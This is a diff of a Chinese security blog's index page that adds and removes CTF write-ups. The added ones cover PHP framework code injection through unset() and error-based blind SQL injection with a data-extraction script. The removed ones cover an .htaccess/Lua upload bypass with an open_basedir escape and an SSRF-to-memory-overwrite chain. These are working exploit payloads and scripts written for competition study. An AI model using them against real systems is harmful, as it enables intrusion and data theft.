@@ -207,6 +207,294 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/hfctfunsetme.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/hfctfunsetme.html" class="post-title-link" itemprop="url">虎符unsetme Write Up</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-04 11:46:40 / 修改时间：11:47:00" itemprop="dateCreated datePublished" datetime="2021-04-04T11:46:40+08:00">2021-04-04</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h1><p>题目直接给出源码：</p>
+<pre><code class="php"> &lt;?php
+// Kickstart the framework
+$f3=require(&#39;lib/base.php&#39;);
+
+$f3-&gt;set(&#39;DEBUG&#39;,1);
+if ((float)PCRE_VERSION&lt;8.0)
+    trigger_error(&#39;PCRE version is out of date&#39;);
+// Load configuration
+highlight_file(__FILE__);
+$a=$_GET[&#39;a&#39;];
+unset($f3-&gt;$a);
+$f3-&gt;run();</code></pre>
+<p>源码和WMCTF中的一个框架反序列化是同一个框架，网上下载源码来测试一下：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210403-201113@2x.png" alt="WX20210403-201113@2x"></p>
+<p>发现<code>/lib/base.php</code>533行有一处eval报错，跟进发现<code>$val</code>是由<code>$hive</code>属性得到。</p>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210403-201457@2x.png" alt="WX20210403-201457@2x" style="zoom:33%;">
+
+<p>可以很明显发现<code>$val</code>由<code>$key</code>拼接<code>@hive</code>进过正则匹配过滤后再进行替换得到，我们继续跟进<code>$key</code>会发现他来源于<code>__unset</code>魔术方法。</p>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210403-202815@2x.png" alt="WX20210403-202815@2x" style="zoom:33%;">
+
+<p><code>__unset</code>这个魔术方法会在外部使用<code>unset()</code>函数销毁类的属性时候被触发。正好咱们回到·<code>index.php</code>就使用<code>unset</code>来销毁属性。</p>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210403-203036@2x.png" alt="WX20210403-203036@2x" style="zoom:25%;">
+
+<p>也就是说<code>$key</code>就是<code>$_GET[&#39;a&#39;]</code>,测试发现<code>$this-&gt;compile</code>会将<code>key</code>替换为<code>[&#39;   &#39;]</code>包裹下。这就说明我们需要绕过这个规格才能执行任意代码。</p>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210403-203421@2x.png" alt="WX20210403-203421@2x" style="zoom:33%;">
+
+<p>我们跟进<code>$this-&gt;compile</code>方法，由于参数2传入就是false咱们直接进入第一个分支。可以看到分支使用<code>preg_replace_callback</code>进行了两次匹配替换。第一次匹配将<code>hive</code>匹配到然后在前面拼接<code>$</code>得到<code>$hive</code>第二次就是把我们传入的字符串给匹配进去，然后用<code>[&#39;   &#39;]</code>包裹起来，但是<code>[]</code>并不会被匹配进去。因此咱么可以利用这个特性逃逸，只要写入一个二维数组就行了。</p>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210403-205303@2x.png" alt="WX20210403-205303@2x" style="zoom:33%;">
+
+<pre><code class="php">function compile($str, $evaluate=TRUE) {
+        return (!$evaluate)
+            ? preg_replace_callback(
+                &#39;/^@(\w+)((?:\..+|\[(?:(?:[^\[\]]*|(?R))*)\])*)/&#39;,
+                function($expr) {
+
+                    $str=&#39;$&#39;.$expr[1];
+                    if (isset($expr[2]))
+                        $str.=preg_replace_callback(
+                            &#39;/\.([^.\[\]]+)|\[((?:[^\[\]\&#39;&quot;]*|(?R))*)\]/&#39;,
+                            function($sub) {
+                                $val=isset($sub[2]) ? $sub[2] : $sub[1];
+                                if (ctype_digit($val))
+                                    $val=(int)$val;
+                                $out=&#39;[&#39;.$this-&gt;export($val).&#39;]&#39;;
+
+                                return $out;
+                            },
+                            $expr[2]
+                        );
+
+                    return $str;
+                },
+                $str
+            )
+      ....
+      略</code></pre>
+<p>那么哪里有二维数组呢，当然是在<code>hive</code>属性里找，直接将其输出看到很多</p>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210403-201957@2x.png" alt="WX20210403-201957@2x" style="zoom:33%;">
+
+<p>因此构造payload如下：</p>
+<pre><code>?a=JAR[&#39;expire&#39;]);phpinfo(</code></pre><img src=" https://goodcheerleung.gitee.io/macpic/WX20210403-205529@2x.png" alt="WX20210403-205529@2x" style="zoom: 25%;">
+
+<p>直接读flag即可：</p>
+<pre><code>?a=JAR[&#39;expire&#39;]);readfile(&#39;/flag&#39;</code></pre><p><img src="https://goodcheerleung.gitee.io/macpic/WX20210403-205651@2x.png" alt="WX20210403-205651@2x"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/ezsqliwp.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/ezsqliwp.html" class="post-title-link" itemprop="url">Easysqli WriteUp（我TM烦死了）</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-04-03 22:28:20" itemprop="dateCreated datePublished" datetime="2021-04-03T22:28:20+08:00">2021-04-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-04 11:44:56" itemprop="dateModified" datetime="2021-04-04T11:44:56+08:00">2021-04-04</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><h3 id="基于运行错误的Bool型盲注"><a href="#基于运行错误的Bool型盲注" class="headerlink" title="基于运行错误的Bool型盲注"></a>基于运行错误的Bool型盲注</h3><p>什么是<code>基于运行错误的Bool型盲注</code>？</p>
+<p>简单的说就是它能够通过MYSQL解释器检查，但是运行时候又会产生错的函数。我们可以用它来进行布尔型盲注。我们下面就来讲解一下一些能够通过MYSQL解释器的预检查却在运行时候出现错误的SQL函数。</p>
+<h4 id="Spatial-Functions"><a href="#Spatial-Functions" class="headerlink" title="Spatial Functions"></a>Spatial Functions</h4><p><code>ST_GeomFromText</code>、<code>ST_MPointFromText</code>是两个可以从<code>文本</code>中解析Spatial function的函数，如果我们的语法各方面都复合mysql的规则，如果我们在解析文本中做手脚呢？MYSQL解释器不会检查一个字符串是否复合MYSQL语法要求，很明显这样我们就可以绕过MYSQL预检查，但是在运行时候又「恰逢其时」地出错，这样我们就可以进行Bool盲注了。需要注意的是<code>ST_GeomFromText</code>针对的是<code>POINT()</code>函数，<code>ST_MPointFromText</code>针对的是<code>MULTIPOINT()</code>函数的。</p>
+<p>以<code>ST_GeomFromText</code>为例：</p>
+<p>例如构造如下SQL语句,很明显POINT函数传入的必须是GIS中的地理坐标的数据类型，这里写入的是一个常量或者undefined类型，但是他却能正常运行。</p>
+<pre><code class="MYSQL">mysql&gt; SELECT IF(0, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0);
++---------------------------------------------------+
+| IF(0, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0) |
++---------------------------------------------------+
+|                                                 0 |
++---------------------------------------------------+
+1 row in set (0.00 sec)</code></pre>
+<p><img src="/Users/gqleung/picture/WX20210126-011441@2x.png" alt="WX20210126-011441@2x"></p>
+<p>假设我们将<code>if</code>的表达式改成<code>false</code>呢，很明显会执行中间的参数，POINT的数据类型错误会导致报错。</p>
+<pre><code class="mysql">mysql&gt; SELECT IF(1, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0);
+ERROR 3037 (22023): Invalid GIS data provided to function st_geometryfromtext.</code></pre>
+<p><img src="/Users/gqleung/picture/WX20210126-012024@2x.png" alt="WX20210126-012024@2x"></p>
+<p>总结，其他可用的函数：</p>
+<pre><code class="MYSQL">SELECT IF({}, ST_X(ST_GeomFromText(&#39;POINT(mads)&#39;)), 0);
+SELECT IF({}, ST_MPointFromText(&#39;MULTIPOINT (mads)&#39;),0);
+SELECT IF({}, ST_X(MADS), 0);
+SELECT IF({}, ST_MPointFromText(&#39;MADS&#39;),0);
+SELECT IF({}, ST_GeomFromText(&#39;MADS&#39;),0);</code></pre>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>经过fuzz可以发现这个靶机不论参数传递数字都是会返回同一张图，但是如果存在被ban掉的字符会返回如下图：</p>
+<p><img src="/Users/gqleung/picture/WX20210126-014859@2x.png" alt="WX20210126-014859@2x"></p>
+<p>我们可以借此FUZZ出被ban掉的关键字：</p>
+<pre><code class="MYSQL">union、*、&#39;、&quot;、substr、mid、=、like、into、file、sleep、benchmark、 、^、or、、、、&amp;、&gt;、&lt;、#、-、ascii、ord、floor、extractvalue、updatexml、if、rp、rep、GET_LOCK、info</code></pre>
+<ul>
+<li><p>这里过滤了空格，这里可以直接用<code>\t</code>来代替空格，URL编码后是%09,在写脚本时候可以使用TAB键来代替。</p>
+</li>
+<li><p>过滤了单双引号，可以使用十六进制来代替字符串。</p>
+</li>
+<li><p>过滤了<code>if</code>可以使用<code>case when....then....else...end</code>代替</p>
+</li>
+<li><p>过滤了等于号、大于、小于、减号、like、我们可以使用正则表达式来判断也就是regexp</p>
+</li>
+</ul>
+<p>我们通过上面所讲解的<code>ST_GeomFromText</code>,结合上述过滤考点，构造如下payload,当然空格要用%09代替。</p>
+<pre><code class="mysql">index.php?id=1    and    case    WHEN    user()    regexp    0x61    then    ST_X(ST_GeomFromText(0x504F494E54286D61647329))    else    0    end</code></pre>
+<p>如果if表达式为false可以发现返回正常的页面：</p>
+<p><img src="/Users/gqleung/picture/WX20210127-211626@2x.png" alt="WX20210127-211626@2x"></p>
+<p>若if表达式为true,那么将会返回运行错误的页面：</p>
+<p><img src="/Users/gqleung/picture/WX20210127-211536@2x.png" alt="WX20210127-211536@2x"></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>据此编写Python脚本：</p>
+<pre><code class="PYTHON">#author：Gqleung
+#Email:  admin@plasf.cn
+#blog:   http://www.plasf.cn
+
+import requests
+
+def ord2hex(string):
+    result = &quot;&quot;
+    for i in string:
+        r = hex(ord(i));
+        r = r.replace(&#39;0x&#39;,&#39;&#39;)
+        result = result+r
+    return &#39;0x&#39;+result
+
+url = &quot;http://39.107.126.173:7890&quot;
+tables = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-}{&#39;
+result=&quot;&quot;
+flag=1
+result2=&quot;&quot;
+for i in range(1,70):
+    for j in tables:
+        payload = &quot;/index.php?id=1    and    case    WHEN    (select    flag    from    flag)    regexp    binary    %s    then    ST_X(ST_GeomFromText(0x504F494E54286D61647329))    else    0    end&quot;%(ord2hex(&#39;^&#39;+result+j))    
+        r = requests.get(url+payload);
+        if &#39;cat&#39; not in r.text:
+            result=result+j
+            print(result)
+            break</code></pre>
+<p>运行结果：</p>
+<p><img src="/Users/gqleung/picture/WX20210127-213047@2x.png" alt="WX20210127-213047@2x"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/hongmingguctf.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2157,423 +2445,6 @@ for ($ascii = 0; $ascii &lt; 256; $ascii++) {
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/a882b8c55b5a7.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/a882b8c55b5a7.html" class="post-title-link" itemprop="url">西湖论剑newupload Write up</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-10-13 21:19:41" itemprop="dateCreated datePublished" datetime="2020-10-13T21:19:41+08:00">2020-10-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:04:12" itemprop="dateModified" datetime="2020-10-14T17:04:12+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.1k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="NEWUPLOAD"><a href="#NEWUPLOAD" class="headerlink" title="NEWUPLOAD"></a>NEWUPLOAD</h3><ul>
-<li>一开始比赛一直上传503，以为环境坏了。复现发现<code>.htaccess</code>可以直接上传，图片只能上传<code>jpg</code>.搞一个图片马，后缀直接换行绕过。</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201012-000158@2x.png" alt="WX20201012-000158@2x"></p>
-<h3 id="Bypass-open-dir"><a href="#Bypass-open-dir" class="headerlink" title="Bypass open_dir"></a>Bypass open_dir</h3><ul>
-<li>由于开了open_dir读不了根目录。所以直接<code>bypass open_dir</code>,bypass代码。</li>
-</ul>
-<pre><code class="php">&lt;?php
-ini_set(&#39;open_basedir&#39;,&#39;/tmp&#39;);
-mkdir(&#39;/tmp/fuck/&#39;);
-chdir(&#39;/tmp/fuck/&#39;);
-ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
-chdir(&#39;..&#39;);
-chdir(&#39;..&#39;);
-chdir(&#39;..&#39;);
-chdir(&#39;..&#39;);
-ini_set(&#39;open_basedir&#39;,&#39;/&#39;);
-var_dump(scandir(&#39;/&#39;));
-?&gt;</code></pre>
-<ul>
-<li>直接上传读到根目录文件情况。</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201012-000711@2x.png" alt="WX20201012-000711@2x"></p>
-<h3 id="Getflag"><a href="#Getflag" class="headerlink" title="Getflag"></a>Getflag</h3><ul>
-<li>可以看到有readflag</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201012-000850@2x.png" alt="WX20201012-000850@2x"></p>
-<ul>
-<li><p>直接上.htaccess让它解析lua,再用lua读flag.</p>
-</li>
-<li><p>.htaccess</p>
-</li>
-</ul>
-<pre><code>AddHandler lua-script .lua</code></pre><p><img src="https://goodcheerleung.gitee.io/macpic/WX20201012-001057@2x.png" alt="WX20201012-001057@2x"></p>
-<ul>
-<li>lua脚本</li>
-</ul>
-<pre><code class="php">require &quot;string&quot;
-
---[[
-     This is the default method name for Lua handlers, see the optional
-     function-name in the LuaMapHandler directive to choose a different
-     entry point.
---]]
-function handle(r)
-    r.content_type = &quot;text/plain&quot;
-    r:puts(&quot;Hello Lua World!\n&quot;)
-    local t = io.popen(&#39;/readflag&#39;)
-    local a = t:read(&quot;*all&quot;)
-    r:puts(a)
-    if r.method == &#39;GET&#39; then
-        for k, v in pairs( r:parseargs() ) do
-            r:puts( string.format(&quot;%s: %s\n&quot;, k, v) )
-        end
-    else
-        r:puts(&quot;Unsupported HTTP method &quot; .. r.method)
-    end
-end</code></pre>
-<ul>
-<li>Getflag</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201012-001357@2x.png" alt="WX20201012-001357@2x"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5a07c1f3f.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d5a07c1f3f.html" class="post-title-link" itemprop="url">【转载】西湖论剑 Flagshop 分析复现</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-10-13 13:12:04" itemprop="dateCreated datePublished" datetime="2020-10-13T13:12:04+08:00">2020-10-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-20 11:38:44" itemprop="dateModified" datetime="2020-10-20T11:38:44+08:00">2020-10-20</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>4.7k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul>
-<li>(文章首发于合天智汇)比赛时候没能做出来，其实这道题就是一道pwn题。</li>
-</ul>
-<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><ul>
-<li>抓包或者看源码就会发现有一个SSRF，但是没有权限读flag，测试发现存在一个readflag的elf文件。</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201013-112129@2x.png" alt="WX20201013-112129@2x"></p>
-<ul>
-<li>读取题目全部源码：</li>
-</ul>
-<blockquote>
-<p>backend.php</p>
-</blockquote>
-<pre><code class="php">&lt;?php
-
-$offset = isset($_GET[&#39;offset&#39;]) ? $_GET[&#39;offset&#39;] : 0;
-$buffer = isset($_GET[&#39;buffer&#39;]) ? $_GET[&#39;buffer&#39;] : &quot;&quot;;
-
-if (isset($_GET[&#39;writefile&#39;])) {
-    $fp = fopen($_GET[&#39;writefile&#39;], &quot;a&quot;);
-    fseek($fp, $offset);
-    fwrite($fp, $buffer);
-    fclose($fp);
-}
-
-if (isset($_GET[&#39;readfile&#39;])) {
-    echo file_get_contents($_GET[&#39;readfile&#39;]);
-}
-?&gt;</code></pre>
-<blockquote>
-<p>index.php</p>
-</blockquote>
-<pre><code class="php">&lt;?php
-
-if(!isset($_COOKIE[&#39;sandbox&#39;])) {
-  $uuid = system(&quot;/var/www/html/copy&quot;);
-  setcookie(&quot;sandbox&quot;, $uuid);
-  header(&quot;Location: sandbox/&quot;.$uuid);
-} else {
-  header(&quot;Location: sandbox/&quot;.$_COOKIE[&#39;sandbox&#39;]);
-}</code></pre>
-<h3 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h3><ul>
-<li>从源码可以知道，这里是存在一个文件写入的问题，但是测试和对copy这个elf文件反编译发现，网站根目录是没有写入权限的。但是测试发现tmp目录是可写的。</li>
-<li>做到这里基本没思路了。后面看了下Nul1的wp,发现这就是这道pwn题改的。(<a href="https://www.pianshen.com/article/4537767804/" target="_blank" rel="noopener">https://www.pianshen.com/article/4537767804/</a>)</li>
-</ul>
-<h3 id="内存泄露和动态链接库"><a href="#内存泄露和动态链接库" class="headerlink" title="内存泄露和动态链接库"></a>内存泄露和动态链接库</h3><blockquote>
-<p> /proc/self/maps</p>
-<p> 包含了当前进程映射的内存区域以及他们的访问权限.文件格式如下:</p>
-</blockquote>
-<pre><code class="shell">address           perms offset  dev   inode   pathname
-08048000-08056000 r-xp 00000000 03:0c 64593   /usr/sbin/gpm
-08056000-08058000 rw-p 0000d000 03:0c 64593   /usr/sbin/gpm
-08058000-0805b000 rwxp 00000000 00:00 0
-40000000-40013000 r-xp 00000000 03:0c 4165    /lib/ld-2.2.4.so
-40013000-40015000 rw-p 00012000 03:0c 4165    /lib/ld-2.2.4.so
-4001f000-40135000 r-xp 00000000 03:0c 45494   /lib/libc-2.2.4.so
-40135000-4013e000 rw-p 00115000 03:0c 45494   /lib/libc-2.2.4.so
-4013e000-40142000 rw-p 00000000 00:00 0
-bffff000-c0000000 rwxp 00000000 00:00 0</code></pre>
-<ul>
-<li>通过SSRF漏洞直接读取<code>/proc/self/maps</code>来泄露当前程序调用的到动态链接库和内存地址。</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201013-114932@2x.png" alt="WX20201013-114932@2x"></p>
-<ul>
-<li>直接把/lib/x86_64-linux-gnu/libc-2.19.so通过SSRF读取然后下载下来，通过readelf来查看system的地址。可以得知system函数的偏移是：<code>0x0000000000046590</code></li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201013-115346@2x.png" alt="WX20201013-115346@2x"></p>
-<ul>
-<li>我们将动态链接库的地址加上<code>system</code>的偏移就能计算出<code>system</code>函数的地址。</li>
-</ul>
-<pre><code class="php">&lt;?php
-echo dechex(0x7ffff5f40000+0x0000000000046590);
-//system函数结果：0x7ffff5f86590
-?&gt;</code></pre>
-<h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><ul>
-<li><p>我们知道system函数的地址，我们就可以将open函数的地址替换为<code>system</code>函数的地址，我们在<code>file_get_contents</code>传入参数为系统命令实际执行的却是system函数，这样我们将readflag的结果输出到文件，或者反弹shell。这样我们下一步就是要计算open函数在二进制文件中的实际偏移，最后直接修改内存。</p>
-</li>
-<li><p>这里需要用到<code>/proc/self/exe</code></p>
-</li>
-</ul>
-<blockquote>
-<p>在Linux2.2的内核及其之后,/proc/pid/exe是直接执行的二进制文件的符号链接.这个符号链接能够被取消.尝试打开这个文件就相当与打开了二进制文件,甚至可以通过重新输入/proc/pid/exe重新运行一个对应于pid的二进制文件.在一个多线程的程序中,如果主线程已经退出了,就无法访问这个符号链接.</p>
-<p>在Linux2.0及其之前,/proc/pid/exe是指向当前进程执行的二进制文件.</p>
-</blockquote>
-<ul>
-<li>同样我们之间将其搞下来，用下面脚本来计算open函数的偏移。</li>
-</ul>
-<pre><code class="php">&lt;?php
-function packlli($value) {
-    $higher = ($value &amp; 0xffffffff00000000) &gt;&gt; 32;
-    $lower = $value &amp; 0x00000000ffffffff;
-    return pack(&#39;V2&#39;, $lower, $higher);
-}
-
-function unp($value) {
-    return hexdec(bin2hex(strrev($value)));
-}
-function parseelf($bin_ver, $rela = false) {
-    $bin = file_get_contents($bin_ver);
-    $e_shoff = unp(substr($bin, 0x28, 8));
-    $e_shentsize = unp(substr($bin, 0x3a, 2));
-    $e_shnum = unp(substr($bin, 0x3c, 2));
-    $e_shstrndx = unp(substr($bin, 0x3e, 2));
-
-    for($i = 0; $i &lt; $e_shnum; $i += 1) {
-        $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + 4, 4));
-        if($sh_type == 11) { // SHT_DYNSYM 
-            $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
-            $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
-            $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
-        }
-        elseif(!isset($strtab_off) &amp;&amp; $sh_type == 3) { // SHT_STRTAB
-            $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
-            $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
-        }
-        elseif($rela &amp;&amp; $sh_type == 4) { // SHT_RELA
-            $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
-            $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
-            $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
-        }
-    }
-
-    if($rela) {
-        for($i = $relaplt_off; $i &lt; $relaplt_off + $relaplt_size; $i += $relaplt_entsize) {
-            $r_offset = unp(substr($bin, $i, 8));
-            $r_info = unp(substr($bin, $i + 8, 8)) &gt;&gt; 32;
-            $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4));
-            $name = &#39;&#39;;
-            $j = $strtab_off + $name_off - 1;
-            while($bin[++$j] != &quot;\0&quot;) {
-                $name .= $bin[$j];
-
-            }
-
-            if($name == &#39;open&#39;) {
-                return $r_offset;
-            }
-        }
-    }
-    else {
-        for($i = $dynsym_off; $i &lt; $dynsym_off + $dynsym_size; $i += $dynsym_entsize) {
-            $name_off = unp(substr($bin, $i, 4));
-            $name = &#39;&#39;;
-            $j = $strtab_off + $name_off - 1;
-            while($bin[++$j] != &quot;\0&quot;) {
-                $name .= $bin[$j];
-            }
-            if($name == &#39;__libc_system&#39;) {
-                $system_offset = unp(substr($bin, $i + 8, 8));
-            }
-            if($name == &#39;__open&#39;) {
-                $open_offset = unp(substr($bin, $i + 8, 8));
-            }
-        }
-        return array($system_offset, $open_offset);
-    }
-}
-$open_php = parseelf(&#39;exe&#39;, true);
-//$maps = file_get_contents(&#39;lib.txt&#39;);
-//$pie_base =(hexdec(explode(&#39;-&#39;, $maps)[0]));
-echo $open_php;
-//结果：15333784
-?&gt;</code></pre>
